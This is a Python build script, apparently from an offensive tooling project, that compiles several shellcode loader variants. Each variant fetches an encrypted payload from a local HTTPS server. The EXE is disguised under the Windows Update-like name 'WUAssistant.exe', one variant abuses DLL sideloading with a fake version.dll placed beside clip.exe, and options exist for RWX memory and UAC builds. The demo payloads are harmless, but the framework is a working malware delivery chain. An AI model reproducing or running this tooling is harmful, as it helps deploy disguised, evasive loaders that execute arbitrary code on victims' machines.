#!/usr/bin/env python3
"""Batch-build a set of demo loader EXE/DLL variants, each wrapping a
different shellcode. Each variant lives in `demos/<label>/` and downloads
its encrypted payload from https://127.0.0.1:18443/<label>.dat .

Run host-payload-multi.py first pointing at `demos/_payloads/`."""
import os, shutil, subprocess, sys
from pathlib import Path

ROOT    = Path(__file__).resolve().parents[2]
TESTDIR = Path(__file__).resolve().parent
DEMOS   = TESTDIR / "demos"
ENC_DIR = DEMOS / "_payloads"

VS_VC   = Path(r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat")

# label -> (shellcode_filename_under_payloads/, build_kind, extra_cflags)
#   build_kind: "exe", "exe-uac", "sideload"
VARIANTS = [
    ("msgbox-exe",         "msgbox-shellcode.bin",    "exe",      ""),
    ("whoami-exe",         "whoami-shellcode.bin",    "exe",      ""),
    ("notepad-exe",        "notepad-shellcode.bin",   "exe",      ""),
    ("pwsh-exe",           "pwsh-shellcode.bin",      "exe",      ""),
    ("cmd-exe",            "cmd-shellcode.bin",       "exe",      ""),
    ("calc-rwx-exe",       "calc-shellcode.bin",      "exe",      "/DRWX_SHELLCODE"),
    ("calc-debug-exe",     "calc-shellcode.bin",      "exe",      "/DDEBUG"),
    ("calc-sideload-dll",  "calc-shellcode.bin",      "sideload", ""),
]


def sh(cmd, env=None):
    print(f"$ {cmd}")
    r = subprocess.run(cmd, shell=True, cwd=str(ROOT),
                      capture_output=True, env=env)
    so = r.stdout.decode("utf-8", errors="replace")
    se = r.stderr.decode("utf-8", errors="replace")
    # print last 5 lines only
    for line in (so + se).strip().splitlines()[-5:]:
        print(f"  {line.encode('ascii','replace').decode('ascii')}")
    if r.returncode:
        raise SystemExit(f"failed (rc={r.returncode})")


def main():
    DEMOS.mkdir(exist_ok=True)
    ENC_DIR.mkdir(exist_ok=True)

    for label, sc_name, kind, extra in VARIANTS:
        print(f"\n========== {label} ==========")
        sc = TESTDIR / "payloads" / sc_name
        if not sc.exists():
            print(f"[!] missing {sc}, skip"); continue

        url = f"https://127.0.0.1:18443/{label}.dat"
        sh(f'python Encrypt.py "{sc}" --url "{url}"')

        env = {**os.environ}
        if extra:
            env["CFLAGS_EXTRA"] = extra

        if kind == "exe":
            sh(r'cmd.exe /c ".\build.bat"', env=env)
            artifact = ROOT / "WUAssistant.exe"
            out_name = f"{label}.exe"
        elif kind == "exe-uac":
            sh(r'cmd.exe /c ".\build.bat uac"', env=env)
            artifact = ROOT / "WUAssistant.exe"
            out_name = f"{label}.exe"
        elif kind == "sideload":
            sh(r'python SideloadGen.py "C:\Windows\System32\version.dll"', env=env)
            sh(r'cmd.exe /c ".\build.bat sideload version.dll"', env=env)
            artifact = ROOT / "version.dll"
            out_name = "version.dll"
        else:
            raise SystemExit(f"unknown kind {kind}")

        per_dir = DEMOS / label
        per_dir.mkdir(exist_ok=True)
        shutil.copy2(artifact, per_dir / out_name)
        # Encrypt.py now derives output filename from URL, so the file is
        # already named "<label>.dat" — just move it to the serving dir.
        enc_src = ROOT / f"{label}.dat"
        shutil.copy2(enc_src, ENC_DIR / f"{label}.dat")

        # for sideload: also stage clip.exe + version_orig.dll into the same dir
        if kind == "sideload":
            shutil.copy2(r"C:\Windows\System32\version.dll", per_dir / "version_orig.dll")
            shutil.copy2(r"C:\Windows\System32\clip.exe",    per_dir / "clip.exe")

        print(f"[+] {label} -> {per_dir}/{out_name}  ({(per_dir / out_name).stat().st_size} bytes)")

    print(f"\n[+] All demos in: {DEMOS}")
    print(f"[+] Payload server should serve from: {ENC_DIR}")


if __name__ == "__main__":
    main()
